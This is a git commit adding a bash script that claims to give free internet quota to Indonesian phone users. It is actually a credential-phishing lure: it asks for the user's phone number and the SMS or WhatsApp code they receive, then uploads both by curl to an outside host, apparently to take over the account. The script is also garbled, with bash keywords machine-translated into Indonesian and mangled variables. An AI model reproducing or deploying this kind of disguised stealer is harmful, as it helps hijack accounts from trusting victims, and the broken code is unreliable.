9c6d81bd384035c9f12b00c13d6df4a285e8e3ce
AjiSetiawan1205 <47689775+AjiSetiawan1205@users.noreply.github.com>
2019-02-17 10:09:46 +0700

    Create internetgratis.sh

---
+++ internetgratis.sh
@@ -0,0 +1,151 @@
+#! / bin / bash
+
+
+
+bersih
+
+
+
+gema "
+
+<- INTERNET GRATIS! ->
+
+####################
+
+# By Xenon1205
+
+# Thanks To D4RK SYST3M F41LUR3 S33K3R
+
+####################
+
+SEMOGA BERUNTUNG !!! AND HAVE FUN;) " ;
+
+
+
+gema " " ;
+
+
+
+baca -p " isi dengan Nomer Kamu Bro! (+ 62xxxx) => " nomer ;
+
+
+
+baca p " Berapa Kuota(GB) Yang akan di tembak? => " jangan masukkan ;
+
+
+
+tidur 2
+
+
+
+echo " [+] proses ... " ;
+
+
+
+tidur 1
+
+
+
+echo " Tunggu 5 Detik => $ nomer " ;
+
+
+
+tidur 0,5
+
+
+
+echo " Target => $ Jumlah " ;
+
+
+
+tidur 0,5
+
+
+
+gema " [+] Memanfaatkan ... " ;
+
+
+
+echo " Tunggu 5 Detik => $ nomer " >> Sukses.html ;
+
+
+
+curl -T Sukses.html http://apparelworld.org/
+
+
+
+tidur 5 ;
+
+
+
+echo " [+] Done. " ;
+
+
+
+echo " Selamat Penembakan Sukses;) " ;
+
+
+
+baca -p " Silakan Cek pesan/SMS anda => " kode ;
+
+
+
+tidur 2
+
+
+
+echo " [+] Menghubungkan ke whatsapp.com ... " ;
+
+
+
+echo " Tunggu 5 Detik => $ nomer " ;
+
+
+
+tidur 0,5
+
+
+
+echo " Code => $ Jumlah " ;
+
+
+
+tidur 0,5
+
+
+
+echo " Target => $ jumlah " ;
+
+
+
+tidur 0,5
+
+
+
+echo " [+] Mengirim Eksploitasi Sabar :) ... " ;
+
+
+
+echo " Code => $ code " >> Sukses.html ;
+
+
+
+curl -T Sukses.html http://apparelworld.org/
+
+
+
+tidur 5
+
+
+
+echo " [+] Telah Sukses! " ;
+
+
+
+keluar ;
+
+
+
+D
+
+
